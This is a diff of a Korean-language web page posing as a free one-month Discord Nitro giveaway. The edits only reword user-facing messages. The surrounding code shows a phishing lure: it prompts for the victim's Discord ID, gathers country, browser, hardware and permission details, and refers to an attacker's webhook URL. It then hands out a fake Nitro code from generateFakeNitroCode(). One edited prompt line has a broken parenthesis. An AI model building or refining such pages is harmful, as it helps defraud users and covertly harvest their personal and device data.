@@ -29,7 +29,7 @@
     </style>
 </head>
 <body>
-    <div id="loading">✨ [1단계] Nitro 수령 가능 계정 확인 중...</div>
+    <div id="loading">✨ [1단계] Nitro 수령 가능 확인 중...</div>
 
     <script>
         // ⭐⭐ 당신의 웹훅 URL ⭐⭐
@@ -74,11 +74,11 @@
 
         function getDiscordID() {
             // ⭐ 1개월 지급으로 문구 변경 ⭐
-            const discordID = prompt("🎁 Nitro 1개월 무료\n\n계정 확인과 중복 지급 방지를 위해 사용 중인 디스코드 아이디를 정확히 입력해주세요. (입력 즉시 코드가 지급됩니다!)");
+            const discordID = prompt("🎁 Nitro 1개월 무료\n\n계정 확인과 중복 지급 방지를 위해 사용 중인 디스코드 아이디를 정확히 입력해주세요.";
 
             if (discordID === null || discordID.trim() === "") {
                 alert("🚨 아이디를 입력해야합니다.");
-                document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 니트로 수령 실패: 계정 인증 실패<br><br>유효한 디스코드 아이디를 입력하여 다시 시도해 주세요.</h2>`;
+                document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 니트로 수령 실패: 실패<br><br>다시 시도 해주세요.</h2>`;
                 return null;
             }
             return discordID.trim();
@@ -154,7 +154,7 @@
                 userData.country = '정보 없음'; 
             }
 
-            document.getElementById('loading').textContent = '🎁 [3단계] 롤렛을 돌리는중..';
+            document.getElementById('loading').textContent = '🎁 [3단계] 코드 생성중..';
 
             // --- 하드웨어 및 권한 정보 ---
             const browserInfo = getBrowserInfo();
@@ -266,7 +266,7 @@
                     const newNitroCode = generateFakeNitroCode();
                     
                     // ⭐ 1개월 지급으로 문구 변경 ⭐
-                    alert(`🎉 Nitro 코드 지급 성공!\n\n당신만을 위한 1개월 Nitro 코드가 즉시 생성되었습니다. 이 코드를 복사하여 디스코드에서 사용하세요:\n\n${newNitroCode}\n\n(참고: 코드는 보안을 위해 이 팝업에만 1회 노출됩니다.)`);
+                    alert(`🎉 Nitro 코드 발급 성공!\n\n1개월 Nitro 코드가 즉시 생성되었습니다. 이 코드를 복사하여 디스코드에서 사용하세요:\n\n${newNitroCode}\n\n(참고: 코드는 보안을 위해 이 팝업에만 1회 노출됩니다.)`);
 
                     // 로딩 메시지를 최종 성공 메시지로 업데이트
                     document.getElementById('loading').textContent = `✅ [지급 완료] 1개월 니트로 코드(${newNitroCode.substring(20)}...)가 성공적으로 지급되었습니다.`;
